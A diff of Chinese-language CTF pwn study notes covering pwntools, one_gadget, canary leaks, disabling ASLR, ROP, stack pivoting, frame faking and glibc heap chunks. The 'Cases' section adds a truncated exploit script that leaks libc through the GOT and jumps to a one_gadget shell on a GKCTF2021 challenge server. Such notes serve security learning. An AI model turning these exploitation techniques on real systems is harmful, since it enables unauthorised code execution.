@@ -46,6 +46,36 @@ checksec --file=filename  # 新版
 
 
 
+## one\_gadget
+
+> https://github.com/david942j/one_gadget
+
+- Installation: 
+
+```bash
+sudo apt install ruby
+gem install one_gadget
+one_gadget libc-2.27.so
+one_gadget libc-2.27.so --near exit,mkdir # Reorder gadgets according to the distance of given functions.
+one_gadget /lib/x86_64-linux-gnu/libc.so.6 --near 'write.*' --raw # Regular expression is acceptable.
+one_gadget /lib/x86_64-linux-gnu/libc.so.6 --near spec/data/test_near_file.elf --raw # Pass an ELF file as the argument, OneGadget will take all GOT functions for processing.
+```
+
+
+
+```python
+import subprocess
+def one_gadget(filename):
+	return [int(i) for i in subprocess.check_output(['one_gadget', '--raw', filename]).decode().split(' ')]
+
+one_gadget('/lib/x86_64-linux-gnu/libc.so.6')
+#=> [324293, 324386, 1090444]
+```
+
+
+
+
+
 ## gef
 
 > gef github:   https://github.com/hugsy/gef 
@@ -97,33 +127,61 @@ Installation:
 > docs: https://docs.pwntools.com/en/latest/
 
 - pwn工具集. `pwntools` is a CTF framework and exploit development library. CTF框架，python包
-- WARNING: 网上很多使用pwntools的脚本是基于python2的，需要注意str byte转换，以及可能存在的API行为改变
+- WARNING: 网上很多使用pwntools的脚本是基于python2的，需要注意str byte转换，以及可能存在的API名称/行为改变
 
 ```python
 from pwn import *
 context.log_level = "DEBUG"
-io = remote("127.0.0.1", 32152)
-# 与互联网主机交互
-io.sendline("hello") # sendline发送数据会在最后多添加一个回车
-io.send("hello") # 不会添加回车
+context.binary = ""./pwny" # print(context)
 
-io.recv(1024) # 读取1024个字节
-io.recvuntil() # 读取一直到回车
-io.recvline("hello") # 读取到指定数据
+# ===== 连接
+sh = remote("127.0.0.1", 32152) # 与互联网主机交互
+sh = process("./bin", shell=True) # 启动本地程序进行交互，用于gdb调试
+sh = process("./bin")  # , env={'LD_PRELOAD': './libc.so.6'}
+# process(['ld.so','pwn'],env=xxx)
 
-io.interactive()
+
+# =====elf 
+libc = ELF("./libc.so.6")
+elf = ELF("./login")
+
+
+# ===== 发送
+sh.send("hello") # 不会添加回车
+sh.sendline("hello") # sendline发送数据会在最后多添加一个回车
+sh.sendafter(">", payload) # 在接收到 > 后发送
+
+
+# ===== 接收
+sh.recv(1024) # 读取1024个字节
+
+sh.recvuntil() # 读取一直到回车
+sh.recvuntil("end\n") # 读取一直到 end\n
+sh.recvuntil(b' ', drop=True) # b'331'
+
+sh.recvline()
+sh.recvline(timeout=1) # 超时为1s
+sh.recvline("hello") # 读取到指定数据
+sh.recvline(keepends=False) # 不保存尾部截断字符
+
+sh.interactive()
 ```
 
 
 
 ```python
-io = process("./bin", shell=True) # 启动本地程序进行交互，用于gdb调试
-
-io.p32(0xdeadbeef)
-io.p64(0xdeadbeefdeadbeef)
-io.u32("1234")
-io.u64("12345678")
+sh.p32(0xdeadbeef)
+sh.p64(0xdeadbeefdeadbeef)
+sh.u32("1234")
+sh.u64("12345678")
 # 将字节数组与数组进行以小端对齐的方式相互转化，32负责转化dword，64负责转化qword
+addr_puts = u64(sh.recvline(keepends=False).ljust(8, b'\0')) # 64bit OS接收函数地址 补全 转换
+
+import struct
+p32(0xdeadbeef) == struct.pack('I', 0xdeadbeef) # True # 两者等效
+leet = unhex('37130000')
+u32(b'abcd') == struct.unpack('I', b'abcd')[0] # True # 两者等效
+u8(b'A') == 0x41 # True # 两者等效
 ```
 
 - Installation: 
@@ -139,8 +197,6 @@ python3 -m pip install --upgrade pwntools
 
 
 
-### Tutorials
-
 > https://docs.pwntools.com/en/latest/intro.html
 >
 > 使用`from pwn import *`后，quick list of most of the objects and routines imported: https://docs.pwntools.com/en/latest/globals.html
@@ -149,43 +205,7 @@ python3 -m pip install --upgrade pwntools
 
 
 
-#### Connections
-
-```python
-# 创建远程连接，
-conn = remote('ftp.ubuntu.com', 21) # in pwnlib.tubes.remote # 域名/IP, Port
-conn.recvline() # doctest: +ELLIPSIS # b'220 ...'
-conn.send(b'USER anonymous\r\n') # 需要手动添加\r\n
-conn.recvuntil(b' ', drop=True) # b'331'
-conn.recvline() # b'Please specify the password.\r\n'
-conn.close()
-```
-
-```python
-# spin up a listener
-l = listen() # 创建一个sock用于监听
-r = remote('localhost', l.lport) # 连接刚刚创建的连接l的监听端口 lport
-c = l.wait_for_connection() # 等待连接
-r.send(b'hello')
-c.recv() # b'hello'
-```
-
-```python
-# Interacting with processes # 与进程交互
-sh = process('/bin/sh') # pwnlib.tubes.process
-gdb.attach(sh)
-sh.sendline(b'sleep 3; echo hello world;') # 会自动添加\r\n
-sh.recvline(timeout=1) # b'' # 因为上面执行的命令首先为sleep 3，这里超时后未接收到字符串
-sh.recvline(timeout=5) # b'hello world\n'
-sh.close()
-```
-
-```python
-# Not only can you interact with processes programmatically, but you can actually interact with processes.
->>> sh.interactive() # doctest: +SKIP # 将代码交互转换为手工交互
-$ whoami
-user
-```
+### Connections
 
 
 
@@ -205,29 +225,7 @@ shell.close()
 
 
 
-#### Packing Integers
-
-- 在python表示的整数和字节序列表示之间转换
-
-```python
-import struct
-p32(0xdeadbeef) == struct.pack('I', 0xdeadbeef) # True # 两者等效
-leet = unhex('37130000')
-u32(b'abcd') == struct.unpack('I', b'abcd')[0] # True # 两者等效
-u8(b'A') == 0x41 # True # 两者等效
-```
-
-
-
-#### Target Architecture, OS, Logging
-
-```python
-context.binary = './challenge-binary' # 自动设置所有适当的值 # 官方文档推荐方法
-print(context) # example output:
-# ContextType(arch = 'i386', binary = ELF('/home/kali/CTF/pwn/ret2shellcode'), bits = 32, endian = 'little', os = 'linux')
-```
-
-
+### Target Architecture, OS, Logging, Assembly
 
 ```python
 asm('nop') # b'\x90'
@@ -252,8 +250,6 @@ context.log_level = 'debug'
 log.success("ret_addr:" + hex(ret_addr)) # success logging 
 ```
 
-#### Assembly and Disassembly
-
 > `pwnlib.asm`
 
 ```python
@@ -270,7 +266,7 @@ print(disasm(unhex('6a0258cd80ebf9'))) # machine code to readable assembly
 
 
 
-#### ELF Manipulation
+### ELF Manipulation
 
 ```python
 e = ELF('/bin/cat')
@@ -291,6 +287,34 @@ disasm(open('/tmp/quiet-cat','rb').read(1))
 
 
 ### Cases
+
+> 这里列举的代码通常去掉了很多功能重复的语句，一般无法直接运行也无法解题
+
+```python
+from pwn import *   # ROP_double_leave_tiny_rop_GKCTF2021_checkin # truncated
+
+context.log_level = "DEBUG"
+context.binary = './login'
+# sh = process("./login")  # , env={'LD_PRELOAD': './libc.so.6'}
+# process(['ld.so','pwn'],env=xxx)
+sh = remote("node3.buuoj.cn", 27490)
+libc = ELF("./libc.so.6")
+elf = ELF("./login")
+gdb.attach(sh, "b *(0x401972)\nb *(0x40191C)\nc")
+
+payload = b"admin\0".ljust(0x8, b'\0') + p64(0x401ab3) + p64(elf.got['puts']) + p64(0x4018B5)
+sh.sendafter(">", payload)
+
+data = sh.recvuntil("GeBai\n")
+addr_puts = u64(sh.recvline(keepends=False).ljust(8, b'\0')) # 注意这里接收64bit系统函数地址后的操作
+libc.address = addr_puts - libc.sym['puts']
+print("libc.address =", hex(libc.address))
+
+payload = b"admin\0".ljust(0x18, b'\0') + p64(libc.address + 0xf1247) # one_gadget: 0x45226 0x4527a 0xf03a4 0xf1247
+sh.sendafter(">", payload)
+
+sh.interactive()
+```
 
 
 
@@ -338,26 +362,6 @@ ROPgadget --binary ret2baby  --string "/bin/sh" # 获得 /bin/sh 字符串对应
 
 
 
-## ASLR and Related Setting
-
-> 地址空间配置随机加载  Address space layout randomization  地址空间配置随机化  地址空间布局随机化
->
-> OS层级的保护
->
-> Linux系统上控制ASLR启动与否
-
-- ASLR通过**随机放置进程关键数据区域的地址空间**来防止攻击者能可靠地跳转到内存的特定位置来利用函数。现代操作系统一般都加设这一机制，以防范恶意程序对已知地址进行Return-to-libc攻击
-
-修改`/proc/sys/kernel/randomize_va_space`来控制ASLR启动与否，具体选项：
-
-- 0: 关闭 ASLR，没有随机化。栈、堆、.so 的基地址每次都相同
-- 1: 普通的 ASLR。栈基地址、mmap 基地址、.so 加载基地址都将被随机化，但是堆基地址没有随机化
-- 2: 增强的 ASLR，在 1 的基础上，增加了堆基地址随机化
-
-可以使用`echo 0 > /proc/sys/kernel/randomize_va_space`关闭Linux系统的ASLR。kali20.04测试时需用`sudo bash -c "echo 0 > /proc/sys/kernel/randomize_va_space"`
-
-
-
 
 
 ## Canary
@@ -392,12 +396,12 @@ ROPgadget --binary ret2baby  --string "/bin/sh" # 获得 /bin/sh 字符串对应
 - 开启 Canary 保护的 stack 结构大概如下：
 
 ```assembly
-        High
+        High                              ; +8 for 64bit
         Address |                 |
                 +-----------------+
                 | args            |
                 +-----------------+
-                | return address  |
+      rbp+8 =>  | return address  |
                 +-----------------+
         rbp =>  | old ebp         |
                 +-----------------+
@@ -484,6 +488,8 @@ security_init (void){
 
 
 
+
+
 ### Canary Bypass
 
 > Canary 绕过
@@ -551,7 +557,9 @@ int main(void) {
 
 
 
-#### 泄露栈中的 Canary
+#### Leak Canary
+
+> 泄露栈中的
 
 - Canary 设计为以字节 `\x00` 结尾，本意是为了保证 Canary 可以截断字符串。
 - 泄露栈中的 Canary 的思路是覆盖 Canary 的低字节，来打印出剩余的 Canary 部分。
@@ -640,6 +648,102 @@ ex2.c  canary.py  core    ex2
 
 
 
+## ASLR
+
+> 地址空间配置随机加载  Address space layout randomization  地址空间配置随机化  地址空间布局随机化
+>
+> OS层级的保护。一种防范内存损坏漏洞被利用的计算机安全技术
+>
+> Linux系统上控制ASLR启动与否
+
+- ASLR通过**随机放置进程关键数据区域的地址空间**来防止攻击者能可靠地跳转到内存的特定位置来利用函数。现代操作系统一般都加设这一机制，以防范恶意程序对已知地址进行**Return-to-libc**攻击
+- ASLR 的有效性依赖于整个地址空间布局是否对于攻击者保持未知。只有编译时作为 位置无关可执行文件(Position Independent Executable) **PIE** 的可执行程序才能得到 ASLR 技术的最大保护，因为只有这样，可执行文件的所有代码节区才会被加载在随机地址。PIE 机器码不管绝对地址是多少都可以正确执行。
+
+
+
+ASLR绕过方法：
+
+- 利用地址泄露
+- 访问与特定地址关联的数据
+- 针对 ASLR 实现的缺陷来猜测地址，常见于系统熵过低或 ASLR 实现不完善。
+- 利用侧信道攻击
+
+
+
+修改`/proc/sys/kernel/randomize_va_space`来控制ASLR启动与否，具体选项：
+
+- 0: 关闭 ASLR，没有随机化。栈、堆、.so 的基地址每次都相同
+- 1: 普通的 ASLR。栈基地址、mmap 基地址、.so 加载基地址都将被随机化，但是堆基地址没有随机化
+- 2: 增强的 ASLR，在 1 的基础上，增加了堆基地址随机化
+
+
+
+
+
+
+
+### Settings
+
+查看ASLR是否开启
+
+```bash
+$ cat /proc/sys/kernel/randomize_va_space
+2
+$ sysctl -a --pattern randomize
+kernel.randomize_va_space = 2
+```
+
+关闭ASLR
+
+```bash
+echo 0 > /proc/sys/kernel/randomize_va_space # 关闭Linux系统的ASLR
+sudo bash -c "echo 0 > /proc/sys/kernel/randomize_va_space" # kali20.04测试时需用
+sudo sysctl -w kernel.randomize_va_space=0    <== disable
+```
+
+
+关闭ASLR时，两次ldd的输出值一样。`ldd` 命令会加载共享对象并显示它们在内存中的地址。但是开启ASLR后，每次ldd的输出都不通
+
+```bash
+kernel.randomize_va_space = 0 # 关闭了ASLR
+$ ldd /bin/bash
+        linux-vdso.so.1 (0x00007ffff7fd1000) # same addresses
+        libtinfo.so.6 => /lib/x86_64-linux-gnu/libtinfo.so.6 (0x00007ffff7c69000)
+        libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007ffff7c63000)
+        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff7a79000)
+        /lib64/ld-linux-x86-64.so.2 (0x00007ffff7fd3000)
+$ ldd /bin/bash
+        linux-vdso.so.1 (0x00007ffff7fd1000) # same addresses
+        libtinfo.so.6 => /lib/x86_64-linux-gnu/libtinfo.so.6 (0x00007ffff7c69000)
+        libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007ffff7c63000)
+        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff7a79000)
+        /lib64/ld-linux-x86-64.so.2 (0x00007ffff7fd3000)
+```
+
+```bash
+kernel.randomize_va_space = 2 # 开启增强的ASLR
+$ ldd /bin/bash
+        linux-vdso.so.1 (0x00007fff47d0e000) # first set of addresses
+        libtinfo.so.6 => /lib/x86_64-linux-gnu/libtinfo.so.6 (0x00007f1cb7ce0000)
+        libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f1cb7cda000)
+        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f1cb7af0000)
+        /lib64/ld-linux-x86-64.so.2 (0x00007f1cb8045000)
+$ ldd /bin/bash
+        linux-vdso.so.1 (0x00007ffe1cbd7000) # second set of addresses
+        libtinfo.so.6 => /lib/x86_64-linux-gnu/libtinfo.so.6 (0x00007fed59742000)
+        libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fed5973c000)
+        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fed59552000)
+        /lib64/ld-linux-x86-64.so.2 (0x00007fed59aa7000)
+```
+
+
+
+
+
+
+
+
+
 ## RELRO
 
 > Relocation Read-Only
@@ -691,21 +795,23 @@ Full RELRO:
 
 CPU在执行call指令时需要进行两步操作：
 
-1. 将当前的IP(也就是函数返回地址)入栈，即：`push IP`;
+1. 将当前的IP(也就是函数返回地址)入栈，即：`push IP`; 对ESP/RSP/SP寄存器减去4/8 然后将操作数写到上述寄存器里的指针所指向的内存中。
 2. 跳转，即： `jmp dword ptr 内存单元地址`。
 
-CPU在执行ret指令时只需要恢复IP寄存器即可，因此ret指令相当于`pop IP`。
+`ret`指令相当于`pop IP`, CPU在执行`ret`指令时只需要恢复IP。从栈指针ESP/RSP/SP指向的内存中读取数据，(通常)写到其他寄存器里，然后将栈指针加上4/8
 
 32bit系统：
 
-- ESP: 栈指针寄存器(extended stack pointer), ESP永远指向系统栈最上面一个栈帧的栈顶(低地址)。注意指向的是**栈顶元素的地址**，而**不是下一个空闲地址**。ESP寄存器是固定的，只有当函数的调用后，发生入栈操作而改变
-- EBP: 基址指针寄存器(extended base pointer), EBP永远指向系统栈最上面一个栈帧的底部(高地址)。通常情况下ESP是可变的，随着栈的生产而逐渐变小，用ESP来标记栈的底部
+- ESP: 栈指针寄存器(extended stack pointer), ESP永远指向系统栈最上面一个栈帧的栈顶(低地址)。注意指向的是**栈顶元素的地址**，而**不是下一个空闲地址**。ESP寄存器是固定的，只有当函数的调用后，发生入栈操作而改变。通常情况下ESP是可变的，随着栈的生产而逐渐变小，用EBP来标记栈的底部
+- EBP: 基址指针寄存器(extended base pointer), EBP永远指向系统栈最上面一个栈帧的底部(高地址)。
 
 intel系统中栈是向下生长的(栈越扩大其值越小,堆恰好相反)
 
 通过固定的地址与偏移量来寻找在栈参数与变量，EBP寄存器存放的就是固定的地址。但是这个值在函数调用过程中会变化，函数执行结束后需要还原，因此要在函数的出栈入栈中进行保存
 
-## Order 入栈顺序
+## Push Order
+
+> 入栈顺序
 
 以**Windows/Intel**为例，通常当函数调用发生时，数据将以以下方式存储在栈中：
 
@@ -748,7 +854,7 @@ intel系统中栈是向下生长的(栈越扩大其值越小,堆恰好相反)
 
 
 
-## Examples
+**Examples**
 
 > https://www.tenouk.com/Bufferoverflowc/Bufferoverflow2a.html
 
@@ -784,8 +890,8 @@ int main(int argc, char *argv[]){
 
 函数调用约定通常规定如下几方面内容：
 
-1. 函数参数的传递顺序和方式：最常见的参数传递方式是通过堆栈传递。主调函数将参数压入栈中，被调函数以相对于帧基指针的正偏移量来访问栈中的参数。对于有多个参数的函数，调用约定需规定主调函数将参数压栈的顺序(从左至右还是从右至左)。某些调用约定允许使用寄存器传参以提高性能
-2. 栈的维护方式：主调函数将参数压栈后调用被调函数体，返回时需将被压栈的参数全部弹出，以便将栈恢复到调用前的状态。清栈过程可由主调函数或被调函数负责完成。
+1. 函数**参数的传递顺序和方式**：最常见的参数传递方式是通过堆栈传递。主调函数将参数压入栈中，被调函数以相对于帧基指针的正偏移量来访问栈中的参数。对于有多个参数的函数，调用约定需规定主调函数将参数压栈的顺序(从左至右还是从右至左)。某些调用约定允许使用寄存器传参以提高性能
+2. **栈**的维护方式：主调函数将参数压栈后调用被调函数体，返回时需将被压栈的参数全部弹出，以便将栈恢复到调用前的状态。清栈过程可由主调函数或被调函数负责完成。
 3. 名字修饰(Name-mangling)策略(函数名修饰 Decorated Name 规则：编译器在链接时为区分不同函数，对函数名作不同修饰。若函数之间的调用约定不匹配，可能会产生堆栈异常或链接错误等问题。因此，为了保证程序能正确执行，所有的函数调用均应遵守一致的调用约定
 
 
@@ -795,7 +901,8 @@ int main(int argc, char *argv[]){
 > C调用约定
 
 - **C/C++编译器默认的函数调用约定**。所有非C++成员函数和未使用stdcall或fastcall声明的函数都默认是cdecl方式
-- **参数从右到左入栈，caller负责清除栈中的参数，返回值在EAX**
+- **参数从右到左入栈**
+- **caller负责清除栈中的参数，返回值在EAX**
 - 由于每次函数调用都要产生清除(还原)堆栈的代码，故使用cdecl方式编译的程序比使用stdcall方式编译的程序大(后者仅需在被调函数内产生一份清栈代码)
 - cdecl调用方式**支持可变参数**函数(e.g. `printf`)，且调用时即使实参和形参数目不符也不会导致堆栈错误
 - 对于**C**函数，cdecl方式的名字修饰约定是**在函数名前添加一个下划线**；对于C++函数，除非特别使用extern "C"，C++函数使用不同的名字修饰方式
@@ -803,7 +910,7 @@ int main(int argc, char *argv[]){
 > ### 可变参数函数支持条件
 >
 > 1. 参数自右向左进栈
-> 2. 由主调函数负责清除栈中的参数(参数出栈)
+> 2. 由**主调函数caller负责清除栈中的参数**(参数出栈)
 >
 > 参数按照从右向左的顺序压栈，则参数列表最左边(第一个)的参数最接近栈顶位置。所有参数距离帧基指针的偏移量都是常数，而不必关心已入栈的参数数目。只要不定的参数的数目能根据第一个已明确的参数确定，就可使用不定参数。例如`printf`函数，第一个参数即格式化字符串可作为后继参数指示符。通过它们就可得到后续参数的类型和个数，进而知道所有参数的尺寸。当传递的参数过多时，以帧基指针为基准，获取适当数目的参数，其他忽略即可。若函数参数自左向右进栈，则第一个参数距离栈帧指针的偏移量与已入栈的参数数目有关，需要计算所有参数占用的空间后才能精确定位。当实际传入的参数数目与函数期望接受的参数数目不同时，偏移量计算会出错
 >
@@ -879,6 +986,31 @@ int func(int para);
 ---
 
 # Linux Pwn
+
+
+
+
+
+---
+
+## libc / ld Versions
+
+> 本节主要记录如何获取题目要求的libc.so ld.so版本
+
+- 首先需要安装docker，使用`sudo systemctl start docker`启动，`docker version`查看版本。
+
+```bash
+# 以拉取ubuntu:16.04的libc, ld为例
+sudo docker container run -t -i ubuntu:16.04 /bin/bash # 拉取并运行ubuntu:16.04后进入容器内console
+ls /lib/x86_64-linux-gnu/ | grep libc # 查看含libc字样的文件  可看到版本
+ls /lib/x86_64-linux-gnu/ | grep ld # 查看含ld字样的文件 可看到版本
+# NEW a new console
+sudo docker container ls # 然后复制 ubuntu:16.04 的 CONTAINER ID
+# 复制 ubuntu:16.04 的 /lib/x86_64-linux-gnu/libc-2.23.so 到 /home/kali/libc-2.23.so
+sudo docker cp 3198a81a976d:/lib/x86_64-linux-gnu/libc-2.23.so /home/kali/libc-2.23.so 
+# 复制 ubuntu:16.04 的 /lib/x86_64-linux-gnu/ld-2.23.so 到 /home/kali/ld-2.23.so
+sudo docker cp 3198a81a976d:/lib/x86_64-linux-gnu/ld-2.23.so /home/kali/ld-2.23.so
+```
 
 
 
@@ -1040,10 +1172,9 @@ sh.interactive() # 将代码交互转换为手工交互
 
 
 
+---
 
-
-
-### ROP
+## ROP
 
 > ROP(Return Oriented Programming)   面向返回编程    栈溢出问题
 >
@@ -1072,7 +1203,14 @@ sh.interactive() # 将代码交互转换为手工交互
 
 
 
-#### ret2text
+Important Cases:
+
+- ROP_bamboofox_ret2syscall: 案例小巧简单，但是payload需要精心构造，多次rop，适合学习rop构造方法，rsp变化过程
+- 
+
+
+
+### ret2text
 
 > return to .text of the executable program
 >
@@ -1119,7 +1257,7 @@ sh.interactive() # 将代码交互转换为手工交互
 
 
 
-#### ret2shellcode
+### ret2shellcode
 
 - 控制程序执行shellcode代码（例如sh）
 - shellcode: 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell
@@ -1132,7 +1270,7 @@ sh.interactive() # 将代码交互转换为手工交互
 
 
 
-#### ret2syscall
+### ret2syscall
 
 - 控制程序执行系统调用(system call)，获取 shell
 - Linux 系统调用号：`/usr/include/asm/unistd.h`
@@ -1163,7 +1301,7 @@ sh.interactive() # 将代码交互转换为手工交互
 
 
 
-#### ret2libc
+### ret2libc
 
 > https://wooyun.js.org/drops/return2libc%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html 
 >
@@ -1179,9 +1317,27 @@ readelf -S ret2libc # 可以获得段地址，比如bbs段的地址 # 也可在I
 
 
 
+### Blind ROP (BROP)
 
+> BROP(Blind ROP)于2014年由Standford的Andrea Bittau提出，其相关研究成果发表在Oakland 2014，其论文题目是Hacking Blind
 
+- BROP是**没有对应应用程序的源代码或者二进制文件**下，对程序进行攻击，劫持程序的执行流
 
+**攻击条件**
+
+1. 源程序必须存在栈溢出漏洞，以便于攻击者可以控制程序流程。
+2. 服务器端的进程在崩溃之后会重新启动，并且重新启动的进程的地址与先前的地址一样（这也就是说即使程序有ASLR保护，但是其只是在程序最初启动的时候有效果）。目前nginx, MySQL, Apache, OpenSSH等服务器应用都是符合这种特性的。
+
+**基本思路**：在BROP中，基本的遵循的思路如下
+
+- 判断栈溢出长度
+  - 暴力枚举: 直接从1暴力枚举即可，直到发现程序崩溃
+- Stack Reading
+  - 获取栈上的数据来泄露canaries，以及ebp和返回地址。
+- Blind ROP
+  - 找到足够多的 gadgets 来控制输出函数的参数，并且对其进行调用，比如说常见的 write 函数以及puts函数。
+- Build the exploit
+  - 利用输出函数来 dump 出程序以便于来找到更多的 gadgets，从而可以写出最后的 exploit。
 
 
 
@@ -1191,9 +1347,138 @@ readelf -S ret2libc # 可以获得段地址，比如bbs段的地址 # 也可在I
 
 > 花式栈溢出
 
+#### Stack Pivoting
+
+> 直译 栈旋转. 指劫持栈指针
+>
+> cases: 
+
+劫持栈指针指向攻击者所能控制的内存处，然后再在相应的位置进行 ROP。通常在以下情况需要使用Stack Pivoting
+
+- 可以控制的栈溢出的字节数较少，难以构造较长的 ROP 链。比如可以劫持到bbs, heap。
+- 开启了 PIE 保护，栈地址未知，我们可以将栈劫持到已知的区域
+- 其它漏洞难以利用，需要进行转换。比如说将栈劫持到堆空间，从而在堆上写 rop 及进行堆漏洞利用
+
+利用 stack pivoting 的要求：
+
+1. 可以控制程序执行流。
+
+2. 可以控制 **sp** 指针。一般来说，控制栈指针会使用 ROP，常见的控制栈指针的 gadgets 一般是
+
+```assembly
+pop rsp/esp
+# 利用两次leave 在控制rbp后 间接控制rsp
+leave ...; leave: mov rsp, rbp, pop rbp; # 第一条 leave 利用栈上内容，覆盖rbp
+leave  ; 第二条 leave 把已经被劫持的rbp的值赋值给rsp
+```
+
+- `libc_csu_init` 中的 gadgets，通过偏移可以控制 rsp 指针，上面是正常的，下面是偏移的
+
+```assembly
+gef➤  x/7i 0x000000000040061a
+0x40061a <__libc_csu_init+90>:  pop    rbx
+0x40061b <__libc_csu_init+91>:  pop    rbp
+0x40061c <__libc_csu_init+92>:  pop    r12
+0x40061e <__libc_csu_init+94>:  pop    r13
+0x400620 <__libc_csu_init+96>:  pop    r14
+0x400622 <__libc_csu_init+98>:  pop    r15
+0x400624 <__libc_csu_init+100>: ret    
+gef➤  x/7i 0x000000000040061d
+0x40061d <__libc_csu_init+93>:  pop    rsp
+0x40061e <__libc_csu_init+94>:  pop    r13
+0x400620 <__libc_csu_init+96>:  pop    r14
+0x400622 <__libc_csu_init+98>:  pop    r15
+0x400624 <__libc_csu_init+100>: ret
+```
+
+更加高级的 fake frame: 
+
+可以控制的内存，一般有：
+
+- bss 段。由于进程按页分配内存，分配给 bss 段的内存大小至少一个页(4k，0x1000)大小。然而一般bss段的内容用不了这么多的空间，并且 bss 段分配的内存页拥有读写权限
+- heap。但是这个需要能泄露堆地址
 
 
 
+
+
+
+
+#### Frame Faking
+
+> 帧伪造 栈帧伪造
+>
+> Cases:
+>
+> - GKCTF2021 应急挑战杯 checkin login   对应writeup有详细的劫持过程的分析，分析了一部分重要指令前后rbp rsp的变换
+
+构造一个虚假的栈帧来控制程序的执行流
+
+概括地讲，在之前讲的栈溢出不外乎两种方式
+
+- 控制程序 EIP
+- 控制程序 EBP
+
+其最终都是控制程序的执行流。 frame faking 利用的技巧是同时控制 EBP 与 EIP，在控制程序执行流的同时，也改变程序栈帧的位置。一般来说其 payload 如下
+
+```assembly
+buffer padding | fake ebp | leave ret addr | ; 利用栈溢出将栈上构造为该格式
+```
+
+- 函数的返回地址被覆盖为执行 `leave ret` 的地址，这就表明了函数在正常执行完自己的 `leave ret` 后，还会再次执行一次 `leave ret`
+- 其中 `fake ebp` 为构造的栈帧的基地址，需要注意的是这里是一个地址。是想要劫持过去的目的地址。一般构造的假栈帧如下
+
+```assembly
+fake ebp #  fake ebp 指向 ebp2, 即它为 ebp2 所在的地址
+|
+v
+ebp2|target function addr|leave ret addr|arg1|arg2 # 右边为高地址
+```
+
+- 通常`fake ebp`表示的地址(ebp2)是能够控制的可读的内容
+
+```assembly
+; 函数序言      # 函数的入口点与出口点的基本操作
+push ebp  # 将ebp压栈
+mov ebp, esp #将esp的值赋给ebp
+....
+; 函数尾声
+leave ; mov esp, ebp; pop ebp # 将ebp的值赋给esp, 弹出ebp
+ret # pop eip，弹出栈顶元素作为程序下一个执行地址
+```
+
+- 基本控制过程：Case: GKCTF2021 应急挑战杯 checkin login 就是这个过程
+
+1. 在有栈溢出的程序执行 leave 时，其分为两个步骤
+   - mov esp, ebp ，将 esp 也指向当前栈溢出漏洞的 ebp 基地址处。
+   - pop ebp， 这会将栈中存放的 fake ebp 的值赋给 ebp。即执行完指令之后，ebp便指向了ebp2，也就是保存了 ebp2 所在的地址。`$ebp = addr_of_rbp2`
+2. 执行 ret 指令，会再次执行 leave ret 指令。pop eip,  `$eip = addr_leave_ret`
+3. 执行 leave 指令，其分为两个步骤
+   - mov esp, ebp; 使 esp 指向 ebp2。`$esp = addr_rbp2`
+   - pop ebp; 将 ebp 的值设置为 ebp2 (因为`$esp = addr_rbp2`)，同时 esp 会指向 target function。`$ebp=ebp2, $esp=target_function_addr`, 因为pop后esp+4，所以就指向紧跟在ebp2后的`target_function_addr`
+4. 执行 ret 后程序就会执行 target function(因为现在rsp指向了`target_function_addr`)，当其进行函数序言：
+   - push ebp，会将 ebp2 值压入栈中，
+   - mov ebp, esp，将 ebp 指向当前基地址。`$ebp=$esp=addr_rbp2`
+
+```assembly
+ebp    ; 此时的栈结构
+|
+v
+ebp2|leave ret addr|arg1|arg2
+```
+
+1. 当程序执行时，其会正常申请空间，同时我们在栈上也安排了该函数对应的参数，所以程序会正常执行。
+2. 程序结束后，其又会执行两次 leave ret addr，所以如果我们在 ebp2 处布置好了对应的内容，那么我们就可以一直控制程序的执行流程
+
+在 fake frame 中，必须得有一块可以写的内存，并且还知道这块内存的地址，这一点与 stack pivoting 相似
+
+
+
+
+
+
+
+---
 
 ## Format String Vulnerability
 
@@ -1847,21 +2132,311 @@ cases:
 
 
 
+---
 
-
-## Glibc Heap Utilization
+## Glibc Heap
 
 > Glibc Heap利用
 
-- 对于不同的应用来说，由于内存的需求各不相同等特性，因此目前堆的实现有很多种:
+- 对于不同的应用来说，由于内存的需求各不相同等特性，因此目前堆的实现有很多种: 
 
-```
+```python
 dlmalloc  – General purpose allocator
-ptmalloc2 – glibc
+ptmalloc2 – glibc  # 以 glibc 中堆的实现为主进行介绍 glibc-2.3.x. 之后，glibc 中集成了ptmalloc2
 jemalloc  – FreeBSD and Firefox
 tcmalloc  – Google
 libumem   – Solaris
 ```
+
+在 glibc 内部有精心设计的数据结构来管理heap。与堆相应的数据结构主要分为
+
+- 宏观结构，包含堆的宏观信息，可以通过这些数据结构索引堆的基本信息。
+- 微观结构，用于具体处理堆的分配与回收中的内存块。
+
+### malloc_chunk
+
+**chunk**: 称由 malloc 申请的内存为 chunk。这块内存在 ptmalloc 内部用 malloc_chunk 结构体来表示。当程序申请的 chunk 被 free 后，会被加入到相应的空闲管理列表中
+
+**无论一个 chunk 的大小如何，处于分配状态还是释放状态，它们都使用一个统一的结构**。虽然它们使用了同一个数据结构，但是根据是否被释放，它们的表现形式会有所不同。
+
+malloc_chunk 的结构：
+
+```cpp
+// This struct declaration is misleading (but accurate and necessary). 误导的结构体 仅用作理解
+// It declares a "view" into memory allowing access to necessary fields at known offsets from a given base. See explanation below.
+// ptmalloc 用 malloc_chunk 表示 mallloc 申请的内存(chunk)
+struct malloc_chunk { // default: define INTERNAL_SIZE_T size_t 
+  INTERNAL_SIZE_T      prev_size;  // Size of previous chunk (if free). 
+  INTERNAL_SIZE_T      size;       // Size in bytes, including overhead.
+
+  struct malloc_chunk* fd;         // double links -- used only if free.
+  struct malloc_chunk* bk;
+
+ // Only used for large blocks: pointer to next larger size.
+  struct malloc_chunk* fd_nextsize; // double links -- used only if free.
+  struct malloc_chunk* bk_nextsize;
+};
+```
+
+- **prev_size**: 如果该 chunk 的**物理相邻的前一地址 chunk（两个指针的地址差值为前一 chunk 大小）**是空闲的话，那该字段记录的是前一个 chunk 的大小 (包括 chunk 头)。否则，该字段可以用来存储物理相邻的前一个 chunk 的数据。**这里的前一 chunk 指的是较低地址的 chunk** 。
